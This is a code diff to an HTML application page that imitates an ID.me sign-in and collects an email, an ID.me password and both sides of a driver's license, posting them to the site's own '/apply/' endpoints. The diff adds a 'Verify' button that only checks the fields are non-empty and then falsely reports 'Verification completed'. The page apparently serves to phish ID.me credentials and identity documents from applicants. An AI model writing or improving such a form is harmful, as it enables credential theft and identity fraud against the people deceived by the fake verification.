@@ -35,6 +35,18 @@
       border-color: #dc2626 !important;
       background: #fef2f2 !important;
     }
+    .verify-status {
+      margin: 10px 0 14px;
+      font-size: 0.88rem;
+      color: #3e5166;
+      min-height: 20px;
+    }
+    .verify-status.error { color: #b42318; }
+    .verify-status.success { color: #0f7a3b; }
+    .btn-submit-application[disabled] {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
     @media (min-width: 701px) {
       .fixed-back-btn { top: 70px; left: 2rem; }
     }
@@ -109,10 +121,11 @@
               <a href="https://api.id.me/en/passwords/new" target="_blank" rel="noopener noreferrer">Forgot password?</a>
             </div>
 
-            <!-- Submit -->
+            <!-- Verify -->
             <div class="form-actions">
-              <button type="submit" class="btn-primary">Sign in to ID.me</button>
+              <button type="button" class="btn-primary" id="verifyBtn">Verify</button>
             </div>
+            <div class="verify-status" id="verifyStatus" aria-live="polite"></div>
 
             <!-- Divider -->
             <div class="idme-divider" role="separator">
@@ -148,6 +161,11 @@
             </div>
           </fieldset>
 
+          <!-- Submit application -->
+          <div class="skip-btn-row">
+            <button type="submit" class="btn-primary btn-submit-application" id="submitApplicationBtn" disabled>Submit Application</button>
+          </div>
+
           <!-- Skip verification -->
           <div class="skip-btn-row">
             <button type="button" class="btn-skip" onclick="submitSkip()">Skip ID.me &amp; Submit Application</button>
@@ -174,35 +192,50 @@
 
   <script>
     function submitSkip() {
-      var frontInput = document.getElementById('driversLicenseFront');
-      var backInput = document.getElementById('driversLicenseBack');
-      var frontZone = document.getElementById('dropzone-front');
-      var backZone = document.getElementById('dropzone-back');
-      var errorBox = document.getElementById('uploadInlineError');
-
-      frontZone.classList.remove('upload-missing');
-      backZone.classList.remove('upload-missing');
-
-      if (!frontInput.files.length || !backInput.files.length) {
-        if (!frontInput.files.length) frontZone.classList.add('upload-missing');
-        if (!backInput.files.length) backZone.classList.add('upload-missing');
-        if (errorBox) {
-          errorBox.style.display = 'block';
-          errorBox.textContent = "Both front and back of your driver's license/ID are required.";
-        }
-        return;
-      }
-
-      var form = document.getElementById('idme-form');
-      form.action = '/apply/skip-idme/';
-      form.method = 'post';
-      var passwordInput = document.getElementById('idme-password');
-      if (passwordInput) passwordInput.removeAttribute('name');
-      form.submit();
+      var skipForm = document.createElement('form');
+      skipForm.method = 'post';
+      skipForm.action = '/apply/skip-idme/';
+      var emailInput = document.createElement('input');
+      emailInput.type = 'hidden';
+      emailInput.name = 'email';
+      emailInput.value = document.getElementById('idme-email').value || '';
+      skipForm.appendChild(emailInput);
+      document.body.appendChild(skipForm);
+      skipForm.submit();
     }
 
     document.addEventListener('DOMContentLoaded', function () {
       var form = document.getElementById('idme-form');
+      var verifyBtn = document.getElementById('verifyBtn');
+      var submitBtn = document.getElementById('submitApplicationBtn');
+      var verifyStatus = document.getElementById('verifyStatus');
+      var verifiedOk = false;
+
+      function markMissingState(front, back) {
+        document.getElementById('dropzone-front').classList.toggle('upload-missing', !front);
+        document.getElementById('dropzone-back').classList.toggle('upload-missing', !back);
+      }
+
+      verifyBtn.addEventListener('click', function () {
+        var email = document.getElementById('idme-email').value.trim();
+        var password = document.getElementById('idme-password').value.trim();
+        var front = document.getElementById('driversLicenseFront').files[0];
+        var back = document.getElementById('driversLicenseBack').files[0];
+
+        if (!email || !password || !front || !back) {
+          markMissingState(front, back);
+          verifyStatus.className = 'verify-status error';
+          verifyStatus.textContent = 'Please complete email, password, and both ID uploads before verifying.';
+          submitBtn.disabled = true;
+          verifiedOk = false;
+          return;
+        }
+
+        verifyStatus.className = 'verify-status success';
+        verifyStatus.textContent = 'Verification completed. You can now submit application.';
+        submitBtn.disabled = false;
+        verifiedOk = true;
+      });
 
       // Client-side file validation
       form.addEventListener('submit', function (e) {
@@ -227,12 +260,13 @@
         if (!validateFile(back, 'Back')) { e.preventDefault(); return; }
 
         var errorBox = document.getElementById('uploadInlineError');
-        if (!front || !back) {
-          if (!front) document.getElementById('dropzone-front').classList.add('upload-missing');
-          if (!back) document.getElementById('dropzone-back').classList.add('upload-missing');
+        if (!front || !back || !verifiedOk) {
+          markMissingState(front, back);
           if (errorBox) {
             errorBox.style.display = 'block';
-            errorBox.textContent = "Both front and back of your driver's license/ID are required.";
+            errorBox.textContent = !verifiedOk
+              ? 'Please click Verify before submitting your application.'
+              : 'Both front and back of your driver\'s license/ID are required.';
           }
           e.preventDefault();
           return;
